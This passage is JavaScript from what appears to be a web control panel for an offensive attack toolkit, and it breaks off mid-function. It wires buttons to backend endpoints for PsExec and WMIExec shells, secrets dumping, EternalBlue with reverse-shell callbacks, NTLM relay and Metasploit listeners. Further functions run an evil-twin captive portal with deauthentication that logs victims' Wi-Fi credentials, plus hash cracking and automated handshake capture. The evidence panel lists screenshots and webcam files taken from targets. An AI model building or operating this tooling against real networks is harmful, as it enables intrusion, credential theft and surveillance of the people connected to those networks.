            try {
                const response = await fetch('/api/internal/access/smb/list', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ target, user, password: pass, domain })
                });
                const data = await response.json();
                appendInternalOutput(data.output || data.error);
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
            }
        }
        
        async function psexecShell() {
            const target = document.getElementById('attackTarget').value;
            const user = document.getElementById('attackUser').value;
            const pass = document.getElementById('attackPass').value;
            const domain = document.getElementById('attackDomain').value;
            
            if (!target || !user || !pass) {
                appendInternalOutput('[-] Need target, user, and password');
                return;
            }
            
            appendInternalOutput('[*] PsExec to ' + target + ' as ' + domain + '\\' + user + '...');
            appendInternalOutput('[*] Check terminal for interactive shell');
            
            try {
                const response = await fetch('/api/internal/exploit/psexec', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ target, user, password: pass, domain })
                });
                const data = await response.json();
                appendInternalOutput(data.message || data.error);
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
            }
        }
        
        async function wmiexecShell() {
            const target = document.getElementById('attackTarget').value;
            const user = document.getElementById('attackUser').value;
            const pass = document.getElementById('attackPass').value;
            const domain = document.getElementById('attackDomain').value;
            
            if (!target || !user || !pass) {
                appendInternalOutput('[-] Need target, user, and password');
                return;
            }
            
            appendInternalOutput('[*] WMIExec to ' + target + ' as ' + domain + '\\' + user + '...');
            appendInternalOutput('[*] Check terminal for interactive shell');
            
            try {
                const response = await fetch('/api/internal/exploit/wmiexec', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ target, user, password: pass, domain })
                });
                const data = await response.json();
                appendInternalOutput(data.message || data.error);
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
            }
        }
        
        async function secretsDump() {
            const target = document.getElementById('attackTarget').value;
            const user = document.getElementById('attackUser').value;
            const pass = document.getElementById('attackPass').value;
            const domain = document.getElementById('attackDomain').value;
            
            if (!target || !user || !pass) {
                appendInternalOutput('[-] Need target, user, and password');
                return;
            }
            
            appendInternalOutput('[*] Dumping secrets from ' + target + '...');
            appendInternalOutput('[*] This may take a minute...');
            
            try {
                const response = await fetch('/api/internal/exploit/secretsdump', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ target, user, password: pass, domain })
                });
                const data = await response.json();
                appendInternalOutput(data.output || data.error);
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
            }
        }
        
        async function launchEternalBlue() {
            const target = document.getElementById('attackTarget').value;
            const lhost = document.getElementById('lhostInput').value || '10.0.0.1';
            const lport = document.getElementById('lportInput').value || '4444';
            
            if (!target) {
                appendInternalOutput('[-] No target specified');
                return;
            }
            
            if (!confirm('Launch EternalBlue against ' + target + '? This is a destructive exploit.')) {
                return;
            }
            
            appendInternalOutput('[*] Launching EternalBlue (MS17-010) against ' + target);
            appendInternalOutput('[*] Callback: ' + lhost + ':' + lport);
            appendInternalOutput('[*] Check Metasploit console for shell...');
            
            try {
                const response = await fetch('/api/internal/exploit/eternalblue', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ target, lhost, lport })
                });
                const data = await response.json();
                appendInternalOutput(data.message || data.error);
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
            }
        }
        
        async function startRelay() {
            const target = document.getElementById('attackTarget').value;
            
            if (!target) {
                appendInternalOutput('[-] No relay target specified');
                return;
            }
            
            appendInternalOutput('[*] Starting NTLM relay to ' + target + '...');
            
            try {
                const response = await fetch('/api/internal/exploit/relay/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ target })
                });
                const data = await response.json();
                
                if (data.success) {
                    appendInternalOutput('[+] NTLM relay started');
                    appendInternalOutput('[+] Waiting for auth to relay to ' + target);
                    appendInternalOutput('[+] Interactive shell will be on port 11000 when successful');
                } else {
                    appendInternalOutput('[-] ' + (data.output || data.error));
                }
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
            }
        }
        
        async function startListener() {
            const lhost = document.getElementById('lhostInput').value || '0.0.0.0';
            const lport = document.getElementById('lportInput').value || '4444';
            
            appendInternalOutput('[*] Starting listener on ' + lhost + ':' + lport + '...');
            
            try {
                const response = await fetch('/api/internal/listener/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ lhost, lport })
                });
                const data = await response.json();
                
                if (data.success) {
                    document.getElementById('listenerStatus').textContent = 'Listening';
                    document.getElementById('listenerStatus').style.color = '#0f0';
                    appendInternalOutput('[+] Listener started');
                    appendInternalOutput('[+] Attach with: screen -r msf_listener');
                } else {
                    appendInternalOutput('[-] ' + (data.output || data.error));
                }
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
            }
        }
        
        async function stopListener() {
            try {
                await fetch('/api/internal/listener/stop', { method: 'POST' });
                document.getElementById('listenerStatus').textContent = 'Stopped';
                document.getElementById('listenerStatus').style.color = '#666';
                appendInternalOutput('[*] Listener stopped');
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
            }
        }
        
        async function refreshEvidence() {
            try {
                const response = await fetch('/api/internal/evidence');
                const data = await response.json();
                
                if (data.success && data.evidence) {
                    let html = '';
                    for (const [target, files] of Object.entries(data.evidence)) {
                        html += '<div style="margin-bottom: 10px;">';
                        html += '<div style="color: #0f0; font-weight: bold;">üìÅ ' + esc(target) + '</div>';
                        files.forEach(f => {
                            const icon = f.name.includes('screenshot') ? 'üì∏' :
                                        f.name.includes('webcam') ? 'üì∑' :
                                        f.name.includes('secret') ? 'üîê' : 'üìÑ';
                            html += '<div style="padding: 2px 0 2px 15px;">';
                            html += icon + ' <a href="/api/internal/evidence/' + encodeURIComponent(target) + '/' + encodeURIComponent(f.name) + '" download style="color: #888;">' + esc(f.name) + '</a>';
                            html += '</div>';
                        });
                        html += '</div>';
                    }
                    
                    if (html === '') {
                        html = '<div style="color: #666;">No evidence collected yet...</div>';
                    }
                    
                    document.getElementById('evidenceList').innerHTML = html;
                }
            } catch (err) {
                console.error('Evidence refresh error:', err);
            }
        }
        
        function exportEvidence() {
            window.location.href = '/api/internal/evidence/export';
        }
        
        let nmapPollInterval = null;

        async function nmapScan() {
            const subnet = document.getElementById('nmapSubnet').value.trim();
            if (!subnet) {
                appendInternalOutput('[-] No subnet specified');
                return;
            }
            if (!/^[0-9./]+$/.test(subnet)) {
                appendInternalOutput('[-] Invalid subnet format');
                return;
            }

            const btn = document.getElementById('nmapScanBtn');
            btn.disabled = true;
            btn.textContent = '‚è≥ Scanning...';
            appendInternalOutput('[*] Nmap scan started on ' + subnet + ' (this takes 1-5 minutes)...');

            try {
                const response = await fetch('/api/internal/scan', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ subnet })
                });
                const data = await response.json();

                if (data.success) {
                    // Poll for completion
                    if (nmapPollInterval) clearInterval(nmapPollInterval);
                    nmapPollInterval = setInterval(pollNmapStatus, 3000);
                } else {
                    appendInternalOutput('[-] ' + (data.error || 'Failed to start scan'));
                    btn.disabled = false;
                    btn.textContent = 'üîé Nmap Scan';
                }
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
                btn.disabled = false;
                btn.textContent = 'üîé Nmap Scan';
            }
        }

        async function pollNmapStatus() {
            try {
                const statusRes = await fetch('/api/internal/scan/status');
                const status = await statusRes.json();

                if (status.running) {
                    document.getElementById('nmapScanBtn').textContent = '‚è≥ ' + status.elapsed_seconds + 's...';
                    return;
                }

                // Scan finished ‚Äî stop polling
                clearInterval(nmapPollInterval);
                nmapPollInterval = null;
                document.getElementById('nmapScanBtn').disabled = false;
                document.getElementById('nmapScanBtn').textContent = 'üîé Nmap Scan';

                if (status.error) {
                    appendInternalOutput('[-] Scan error: ' + status.error);
                    return;
                }

                // Fetch results
                const resultsRes = await fetch('/api/internal/scan/results');
                const data = await resultsRes.json();

                if (data.success && data.results) {
                    displayNmapResults(data.results);
                } else {
                    appendInternalOutput('[-] ' + (data.error || 'No results'));
                }
            } catch (err) {
                console.error('Nmap poll error:', err);
            }
        }

        function displayNmapResults(results) {
            let html = '<div style="color: #0f0; margin-bottom: 8px; font-weight: bold;">üîé Nmap Scan Results</div>';
            html += '<table style="width: 100%; border-collapse: collapse; font-size: 11px;">';
            html += '<tr style="color: #888; border-bottom: 1px solid #333;"><th style="text-align: left; padding: 4px;">IP</th><th style="text-align: left; padding: 4px;">Hostname</th><th style="text-align: left; padding: 4px;">Ports</th><th style="text-align: left; padding: 4px;">State</th></tr>';

            const hosts = results.hosts || results.scan || {};
            if (typeof hosts === 'object') {
                for (const [ip, info] of Object.entries(hosts)) {
                    const hostname = info.hostname || info.hostnames || '-';
                    const ports = info.ports || info.open_ports || [];
                    const portStr = Array.isArray(ports) ? ports.map(p => typeof p === 'object' ? (p.port + '/' + (p.service || '')) : p).join(', ') : String(ports);
                    const state = info.state || 'up';
                    html += '<tr style="border-bottom: 1px solid #222;">';
                    html += '<td style="padding: 4px; color: #0f0; cursor: pointer;" onclick="document.getElementById(\'attackTarget\').value=\'' + esc(ip) + '\'" title="Click to set as attack target">' + esc(ip) + '</td>';
                    html += '<td style="padding: 4px; color: #888;">' + esc(hostname) + '</td>';
                    html += '<td style="padding: 4px; color: #ff0;">' + esc(portStr || 'none') + '</td>';
                    html += '<td style="padding: 4px; color: ' + (state === 'up' ? '#0f0' : '#666') + ';">' + esc(state) + '</td>';
                    html += '</tr>';
                }
            }
            html += '</table>';

            document.getElementById('discoveryResults').innerHTML = html;
            appendInternalOutput('[+] Nmap scan complete ‚Äî ' + Object.keys(hosts).length + ' host(s) found');
        }

        async function refreshIntel() {
            appendInternalOutput('[*] Fetching intelligence summary...');
            try {
                const response = await fetch('/api/internal/intel');
                const data = await response.json();

                if (data.success) {
                    const el = document.getElementById('intelSummary');
                    el.style.display = 'block';

                    let html = '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">';
                    html += '<span style="color: #0f0; font-weight: bold;">üß† Intelligence Summary</span>';
                    html += '<span style="color: ' + (data.attack_ready ? '#0f0' : '#666') + '; font-size: 10px;">' + (data.attack_ready ? 'üü¢ ATTACK READY' : '‚ö™ Gathering...') + '</span>';
                    html += '</div>';
                    html += '<div style="color: #888; margin-bottom: 6px;">' + esc(data.summary) + '</div>';

                    if (data.recommendations && data.recommendations.length > 0) {
                        html += '<div style="color: #ff0; margin-bottom: 4px; font-size: 10px;">Recommendations:</div>';
                        data.recommendations.forEach(r => {
                            html += '<div style="color: #ccc; padding-left: 8px; font-size: 10px;">‚Üí ' + esc(r) + '</div>';
                        });
                    }

                    if (data.targets && data.targets.length > 0) {
                        html += '<div style="color: #f00; margin-top: 6px; font-size: 10px;">Targets (' + data.targets.length + '):</div>';
                        data.targets.forEach(t => {
                            const sevColor = t.severity === 'critical' ? '#f00' : t.severity === 'high' ? '#ff0' : '#888';
                            html += '<div style="padding: 2px 0 2px 8px; font-size: 10px;">';
                            html += '<span style="color: ' + sevColor + ';">[' + esc(t.severity).toUpperCase() + ']</span> ';
                            if (/^[0-9a-fA-F.:]+$/.test(t.ip)) {
                                html += '<span style="color: #0f0; cursor: pointer;" onclick="document.getElementById(\'attackTarget\').value=\'' + t.ip + '\'">' + esc(t.ip) + '</span> ‚Äî ';
                            } else {
                                html += '<span style="color: #0f0;">' + esc(t.ip) + '</span> ‚Äî ';
                            }
                            html += '<span style="color: #888;">' + esc(t.description) + '</span>';
                            html += '</div>';
                        });
                    }

                    if (data.cracked_credentials && data.cracked_credentials.length > 0) {
                        html += '<div style="color: #0f0; margin-top: 6px; font-size: 10px;">üîë Cracked Credentials:</div>';
                        data.cracked_credentials.forEach(c => {
                            html += '<div style="padding-left: 8px; font-size: 10px;">';
                            html += '<span style="color: #ff0; cursor: pointer;" data-user="' + esc(c.user) + '" data-pass="' + esc(c.password) + '" data-domain="' + esc(c.domain || 'WORKGROUP') + '" onclick="useCredentials(this.dataset.user, this.dataset.pass, this.dataset.domain)">';
                            html += esc(c.domain || '') + '\\' + esc(c.user) + ' ‚Üí ' + esc(c.password) + ' (click to use)</span>';
                            html += '</div>';
                        });
                    }

                    el.innerHTML = html;
                    appendInternalOutput('[+] Intel loaded ‚Äî ' + (data.attack_ready ? 'ATTACK READY' : 'still gathering'));
                }
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
            }
        }

        async function stopRelay() {
            appendInternalOutput('[*] Stopping NTLM relay...');
            try {
                const response = await fetch('/api/internal/exploit/relay/stop', { method: 'POST' });
                const data = await response.json();
                if (data.success) {
                    appendInternalOutput('[+] NTLM relay stopped');
                } else {
                    appendInternalOutput('[-] ' + (data.error || 'Failed to stop relay'));
                }
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
            }
        }

        function autoAttack(attackType, target) {
            document.getElementById('attackTarget').value = target;

            if (attackType === 'responder') {
                appendInternalOutput('[*] Target is vulnerable to Responder poisoning');
                appendInternalOutput('[*] Start Responder to capture hashes');
            } else if (attackType === 'eternalblue') {
                appendInternalOutput('[*] Target may be vulnerable to EternalBlue');
                appendInternalOutput('[*] Use EternalBlue button to attempt exploit');
            }
        }

        function appendInternalOutput(text) {
            const output = document.getElementById('internalOutput');
            const timestamp = new Date().toLocaleTimeString();
            output.textContent += '\n[' + timestamp + '] ' + text;
            output.scrollTop = output.scrollHeight;
        }
        
        function clearInternalOutput() {
            document.getElementById('internalOutput').textContent = 'Ready for attack operations...';
        }
        
        // ============== PORTAL FUNCTIONS ==============
        
        async function startPortal() {
            const ssid = document.getElementById('portalSSID').value || 'Free WiFi';
            const template = document.getElementById('portalTemplate').value;
            const channel = document.getElementById('portalChannel').value;
            const deauthEnabled = document.getElementById('portalDeauth').checked;
            const deauthMode = document.getElementById('deauthMode').value;
            const wpa2Enabled = document.getElementById('portalWPA2').checked;
            const wpa2Password = document.getElementById('portalPassword').value;
            const postCapture = document.getElementById('postCaptureAction').value;
            const redirectUrl = document.getElementById('redirectUrl').value;
            const output = document.getElementById('portalOutput');
            
            // Evil Twin parameters
            let bssid = '';
            let deauth_target = '';
            let password = '';
            
            // Option D: If deauth enabled, DON'T clone BSSID (so deauth only hits real AP)
            // If deauth disabled but target cloned, clone BSSID for perfect Evil Twin
            if (clonedTarget.bssid) {
                if (deauthEnabled) {
                    // Deauth mode: different BSSID, deauth real AP
                    deauth_target = clonedTarget.bssid;
                    // bssid stays empty - our AP gets random MAC
                } else {
                    // No deauth: clone BSSID for perfect Evil Twin
                    bssid = clonedTarget.bssid;
                }
            }
            
            if (wpa2Enabled && wpa2Password) {
                password = wpa2Password;
            }
            
            // Auto-archive any old creds before starting fresh session
            try {
                await fetch('/api/portal/archive', { method: 'POST' });
                loadArchiveList();
            } catch (e) { /* ignore if nothing to archive */ }
            
            // Clear display for fresh session
            document.getElementById('credentialLog').innerHTML = '<div style="color:#666;">No credentials yet</div>';
            document.getElementById('credentialCount').textContent = '(0)';
            lastCredentialCount = 0;
            
            // Build status message
            let modeText = wpa2Enabled ? 'üîê WPA2 EVIL TWIN' : (deauthEnabled ? '‚ö° EVIL TWIN MODE' : 'Standard Mode');
            let deauthText = deauthEnabled ? '\nDeauth: ACTIVE against ' + deauth_target : '';
            let wpa2Text = wpa2Enabled ? '\nSecurity: WPA2-PSK' : '\nSecurity: Open';
            output.textContent = 'Starting evil portal (' + modeText + ')...\nSSID: ' + ssid + '\nTemplate: ' + template + '\nChannel: ' + channel + wpa2Text + deauthText + '\n\nThis takes about 12 seconds...';
            
            try {
                const response = await fetch('/api/portal/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ssid, template, channel, bssid, deauth_target, password, post_capture: postCapture, redirect_url: redirectUrl, deauth_mode: deauthMode })
                });
                
                const result = await response.json();
                
                if (!result.success) {
                    output.textContent = 'Failed to start: ' + result.output;
                    return;
                }
                
                let attempts = 0;
                const maxAttempts = 15;
                
                const checkStatus = async () => {
                    const statusResponse = await fetch('/api/portal/status');
                    const statusResult = await statusResponse.json();
                    
                    if (statusResult.running) {
                        output.textContent = '‚úÖ Portal is ACTIVE!' + (deauthEnabled ? ' (EVIL TWIN)' : '') + '\n\nSSID: ' + ssid + '\nTemplate: ' + template + '\nChannel: ' + channel + (deauthEnabled ? '\nDeauth: ACTIVE against ' + deauth_target : '') + '\n\nWaiting for victims...';
                        updatePortalStatus();
                        startCredentialPolling();
                    } else {
                        attempts++;
                        if (attempts < maxAttempts) {
                            output.textContent = 'Starting... (' + (attempts * 2) + 's)\n\nInitializing hostapd...\nInitializing dnsmasq...';
                            setTimeout(checkStatus, 2000);
                        } else {
                            output.textContent = '‚ö†Ô∏è Portal start timed out.\nCheck if alfa1 is connected.';
                        }
                    }
                };
                
                setTimeout(checkStatus, 2000);
                
            } catch (error) {
                output.textContent = 'Error: ' + error.message;
            }
        }

        
        async function clearConnections() {
            const output = document.getElementById('portalOutput');
            output.textContent = 'Kicking all connected clients...';
            
            try {
                const response = await fetch('/api/portal/clear', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({})
                });
                
                const result = await response.json();
                output.textContent = result.output;
            } catch (error) {
                output.textContent = 'Error: ' + error.message;
            }
        }
        
        async function stopPortal() {
            const output = document.getElementById('portalOutput');
            output.textContent = 'Shutting down portal services...';
            
            try {
                const response = await fetch('/api/portal/stop', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({})
                });
                
                const result = await response.json();
                output.textContent = '‚¨õ Portal stopped\n\n' + result.output;
                updatePortalStatus();
                stopCredentialPolling();
            } catch (error) {
                output.textContent = 'Error: ' + error.message;
            }
        }
        
        async function viewPortalLog() {
            const output = document.getElementById('portalOutput');
            
            try {
                const response = await fetch('/api/portal/log');
                const result = await response.json();
                
                output.textContent = '=== CAPTURED CREDENTIALS ===\n\n' + result.log;
            } catch (error) {
                updateAttackOutput(`Error: ${error.message}`);
            }
        }
        
        let crackingInterval = null;
        let selectedCrackFile = null;  // Track which file is selected for cracking
        let lastUploadedFile = null;  // Track last file uploaded to Glass
        
        async function startCracking() {
            const output = document.getElementById('crackOutput');
            
            setStatus('CRACKING...', true);
            updateAttackOutput('Starting cracking process...\n');
            
            try {
                const requestBody = {};
                if (selectedCrackFile) {
                    requestBody.filename = selectedCrackFile;
                }
                
                const response = await fetch('/api/crack/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(requestBody)
                });
                
                const result = await response.json();
                updateAttackOutput(result.output);
                
                if (result.success) {
                    // Start polling for status
                    crackingInterval = setInterval(updateCrackStatus, 2000);
                }
            } catch (error) {
                updateAttackOutput(`Error: ${error.message}`);
                setStatus('IDLE', false);
            }
        }
        
        async function updateCrackStatus() {
            try {
                const response = await fetch('/api/crack/status');
                const result = await response.json();
                
                document.getElementById('crackStatusText').textContent = result.status;
                document.getElementById('crackDevice').textContent = result.device;
                document.getElementById('crackProgress').textContent = result.progress;
                document.getElementById('crackSpeed').textContent = result.speed;
                document.getElementById('crackETA').textContent = result.time_remaining;
                
                if (!result.running) {
                    // Cracking finished
                    clearInterval(crackingInterval);
                    crackingInterval = null;
                    setStatus('IDLE', false);
                    document.getElementById('crackOutput').textContent += '\n\n' + result.status;
                }
            } catch (error) {
                console.error('Error updating crack status:', error);
            }
        }
        
        async function stopCracking() {
            const output = document.getElementById('crackOutput');
            
            try {
                const response = await fetch('/api/crack/stop', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({})
                });
                
                const result = await response.json();
                updateAttackOutput(result.output);
                
                if (crackingInterval) {
                    clearInterval(crackingInterval);
                    crackingInterval = null;
                }
                
                setStatus('IDLE', false);
            } catch (error) {
                updateAttackOutput(`Error: ${error.message}`);
            }
        }
        
        async function sendToGlass() {
            const output = document.getElementById('crackOutput');
            const checkedBoxes = document.querySelectorAll('.capture-checkbox:checked');
            if (checkedBoxes.length === 0) {
                updateAttackOutput('Please check a hash file first');
                return;
            }
            const selectedCrackFile = checkedBoxes[0].value;
            setStatus('UPLOADING TO GLASS...', true);
            updateAttackOutput(`Uploading ${selectedCrackFile} to Glass...\n`);
            
            try {
                const response = await fetch('/api/glass/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ filename: selectedCrackFile })
                });
                
                const result = await response.json();
                updateAttackOutput(result.output);
                
                if (result.success) {
                    // Track uploaded file and show indicator
                    lastUploadedFile = selectedCrackFile;
                    document.getElementById('glassCurrentFile').textContent = lastUploadedFile;
                    
                    // Start checking Glass status
                    setTimeout(checkGlassStatus, 3000);
                }
                
                setStatus('IDLE', false);
            } catch (error) {
                updateAttackOutput(`Error: ${error.message}`);
                setStatus('IDLE', false);
            }
        }
        
        async function checkGlassStatus() {
            try {
                const response = await fetch('/api/glass/status');
                const result = await response.json();
                
                document.getElementById('glassStatusText').textContent = result.status || '-';
                document.getElementById('glassProgress').textContent = result.progress || '-';
                document.getElementById('glassSpeed').textContent = result.speed || '-';
                document.getElementById('glassETA').textContent = result.eta || '-';
                
                if (result.running) {
                    setStatus('GLASS CRACKING', true);
                }
            } catch (error) {
                document.getElementById('glassStatusText').textContent = `Error: ${error.message}`;
            }
        }
        
        async function getGlassResult() {
            const output = document.getElementById('crackOutput');
            
            // Use manually selected file if available, otherwise use last uploaded
            const fileToCheck = selectedCrackFile || lastUploadedFile;
            
            if (!fileToCheck) {
                updateAttackOutput('No file selected and no recent upload to Glass');
                return;
            }
            
            try {
                const response = await fetch(`/api/glass/result?filename=${fileToCheck}`);
                const result = await response.json();
                
                if (result.success) {
                    updateAttackOutput(`=== GLASS RESULT ===\n\n${result.result}`);
                    
                    // Clear indicator after successful result retrieval
                    if (fileToCheck === lastUploadedFile) {
                        document.getElementById('glassCurrentFile').textContent = '-';
                        lastUploadedFile = null;
                    }
                } else {
                    updateAttackOutput(result.output);
                }
            } catch (error) {
                updateAttackOutput(`Error: ${error.message}`);
            }
        }
        
        async function loadCaptures() {
            const list = document.getElementById('captureList');
            list.innerHTML = 'Loading...';
            
            try {
                const response = await fetch('/api/captures');
                const result = await response.json();
                
                if (result.captures.length === 0) {
                    list.innerHTML = 'No captures found.';
                    return;
                }
                
                list.innerHTML = '';
                result.captures.forEach(cap => {
                    const label = document.createElement('label');
                    label.style.cursor = 'pointer';
                    label.style.display = 'block';
                    label.style.padding = '2px 5px';
                    
                    const checkbox = document.createElement('input');
                    checkbox.type = 'checkbox';
                    checkbox.className = 'capture-checkbox';
                    checkbox.value = cap.name;
                    checkbox.style.marginRight = '10px';
                    
                    const filenameSpan = document.createElement('span');
                    filenameSpan.textContent = `${cap.name} (${cap.size})`;
                    filenameSpan.style.cursor = 'pointer';
                    filenameSpan.className = 'crack-selectable';
                    filenameSpan.onclick = (e) => {
                        e.stopPropagation();
                        selectForCracking(cap.name);
                    };
                    
                    label.appendChild(checkbox);
                    label.appendChild(filenameSpan);
                    list.appendChild(label);
                });
            } catch (error) {
                list.innerHTML = `Error: ${error.message}`;
            }
        }
        
        async function loadHashFiles() {
            // Load only .hc22000 files for Cracking page
            const list = document.getElementById('captureList');
            list.innerHTML = 'Loading...';
            
            try {
                const response = await fetch('/api/captures?filter=hash');
                const result = await response.json();
                
                if (result.captures.length === 0) {
                    list.innerHTML = 'No hash files found. Convert .cap files first.';
                    return;
                }
                
                list.innerHTML = '';
                result.captures.forEach(cap => {
                    const label = document.createElement('label');
                    label.style.cssText = 'display: block; padding: 5px; margin: 2px 0; background: #001a00; border: 1px solid #003300; cursor: pointer;';
                    
                    const checkbox = document.createElement('input');
                    checkbox.type = 'checkbox';
                    checkbox.className = 'capture-checkbox';
                    checkbox.value = cap.name;
                    checkbox.style.marginRight = '10px';
                    
                    const span = document.createElement('span');
                    span.textContent = cap.name + ' (' + cap.size + ')';
                    span.onclick = (e) => {
                        e.stopPropagation();
                        // Highlight selected for cracking
                        document.querySelectorAll('#captureList label').forEach(l => {
                            l.style.borderColor = '#003300';
                            l.style.background = '#001a00';
                        });
                        label.style.borderColor = '#00ff00';
                        label.style.background = '#003300';
                        selectedCrackFile = cap.name;
                        logGlassActivity('Selected: ' + cap.name);
                    };
                    
                    label.appendChild(checkbox);
                    label.appendChild(span);
                    list.appendChild(label);
                });
            } catch (error) {
                list.innerHTML = 'Error: ' + error.message;
            }
        }
        
        function selectAllCaptures() {
            document.querySelectorAll('.capture-checkbox').forEach(cb => cb.checked = true);
        }
        
        function deselectAllCaptures() {
            document.querySelectorAll('.capture-checkbox').forEach(cb => cb.checked = false);
        }
        
        function selectForCracking(filename) {
            selectedCrackFile = filename;
            
            // Highlight selected file
            document.querySelectorAll('.crack-selectable').forEach(span => {
                span.style.fontWeight = 'normal';
                span.style.color = '#00ff00';
            });
            
            event.target.style.fontWeight = 'bold';
            event.target.style.color = '#00ff00';
            
            // Update crack output to show selected file
            document.getElementById('crackOutput').textContent = `Selected for cracking: ${filename}\n\nClick Start Cracking to begin.`;
        }
        
        async function browseCaptures() {
            try {
                const response = await fetch('/api/captures/browse', { method: 'POST' });
                const result = await response.json();
                if (!result.success) {
                    logGlassActivity('Error: ' + result.output);
                }
            } catch (error) {
                logGlassActivity('Error opening folder: ' + error);
            }
        }
        
        async function deleteSelected() {
            const checkedBoxes = document.querySelectorAll('.capture-checkbox:checked');
            const files = Array.from(checkedBoxes).map(cb => cb.value);
            
            if (files.length === 0) {
                document.getElementById('captureList').innerHTML = 'No files selected.';
                return;
            }
            
            if (!confirm(`Delete ${files.length} file(s)?`)) {
                return;
            }
            
            try {
                const response = await fetch('/api/captures/delete', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ files })
                });
                
                const result = await response.json();
                document.getElementById('captureList').innerHTML = result.output;
                
                // Reload list after 2 seconds
                setTimeout(loadCaptures, 2000);
            } catch (error) {
                document.getElementById('captureList').innerHTML = `Error: ${error.message}`;
            }
        }
        
        async function convertSelected() {
            const checkboxes = document.querySelectorAll('.capture-checkbox:checked');
            const files = Array.from(checkboxes).map(cb => cb.value);
            
            if (files.length === 0) {
                showOutput('No files selected for conversion', 'captureList');
                return;
            }
            
            // Only convert .cap/.pcap/.pcapng files
            const convertibleFiles = files.filter(f => f.endsWith('.cap') || f.endsWith('.pcap') || f.endsWith('.pcapng'));
            
            if (convertibleFiles.length === 0) {
                showOutput('No .cap/.pcap/.pcapng files selected. Only these formats can be converted.', 'captureList');
                return;
            }
            
            showOutput(`Converting ${convertibleFiles.length} file(s)...`, 'captureList');
            
            let successCount = 0;
            let failCount = 0;
            let results = [];
            
            for (const filename of convertibleFiles) {
                try {
                    const response = await fetch('/api/captures/convert', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({filename: filename})
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        successCount++;
                        results.push(`‚úì ${filename}`);
                    } else {
                        failCount++;
                        results.push(`‚úó ${filename}: ${data.output}`);
                    }
                } catch (error) {
                    failCount++;
                    results.push(`‚úó ${filename}: ${error.message}`);
                }
            }
            
            const summary = `Conversion complete:\n${successCount} succeeded, ${failCount} failed\n\n` + results.join('\n');
            showOutput(summary, 'captureList');
            
            // Refresh list to show new .hc22000 files
            setTimeout(() => loadCaptures(), 1000);
        }
        
        async function importCapture() {
            const fileInput = document.getElementById('importFile');
            const file = fileInput.files[0];
            
            if (!file) {
                return;
            }
            
            const list = document.getElementById('captureList');
            list.innerHTML = `Importing ${file.name}...`;
            
            const formData = new FormData();
            formData.append('file', file);
            
            try {
                const response = await fetch('/api/captures/import', {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                list.innerHTML = result.output;
                
                // Clear file input
                fileInput.value = '';
                
                // Reload list after 2 seconds
                setTimeout(loadCaptures, 2000);
            } catch (error) {
                list.innerHTML = `Error: ${error.message}`;
            }
        }
        
        
        
        let autoCaptureInterval = null;
        
        async function autoCaptureAttack() {
            const bssid = document.getElementById('targetBSSID').value;
            const channel = document.getElementById('targetChannel').value;
            const ssid = document.getElementById('targetSSID').value;
            // Using updateAttackOutput() for both panels
            
            if (!bssid || !channel) {
                updateAttackOutput('Please select a target network first!');
                return;
            }
            
            setStatus('AUTO CAPTURE...', true);
            updateAttackOutput('Starting automated attack orchestrator...\n\nWill try all 5 methods in sequence until one succeeds.\n\n');
            
            // Start polling for status
            autoCaptureInterval = setInterval(updateAutoCaptureStatus, 2000);
            
            try {
                const response = await fetch('/api/auto_capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ bssid, channel, ssid })
                });
                
                const result = await response.json();
                
                // Stop polling when complete
                if (autoCaptureInterval) {
                    clearInterval(autoCaptureInterval);
                    autoCaptureInterval = null;
                }
                
                updateAttackOutput(result.output);
            } catch (error) {
                if (autoCaptureInterval) {
                    clearInterval(autoCaptureInterval);
                    autoCaptureInterval = null;
                }
                updateAttackOutput(`Error: ${error.message}`);
            }
            
            setStatus('IDLE', false);
        }
        
        async function updateAutoCaptureStatus() {
            try {
                const response = await fetch('/api/auto_capture_status');
                const status = await response.json();

                // Show status if running OR if there's actual content (method > 0)
                if (status.running || status.current_method > 0) {
                    const minutes = Math.floor(status.elapsed_seconds / 60);
                    const seconds = status.elapsed_seconds % 60;
                    const elapsed = `${minutes}:${seconds.toString().padStart(2, '0')}`;

                    let output = `AUTO CAPTURE ORCHESTRATOR\n\n` +
                        `Method ${status.current_method}/5: ${status.method_name}\n` +
                        `Status: ${status.status}\n` +
                        `Elapsed Time: ${elapsed}\n` +
                        `Last Update: ${status.timestamp}`;

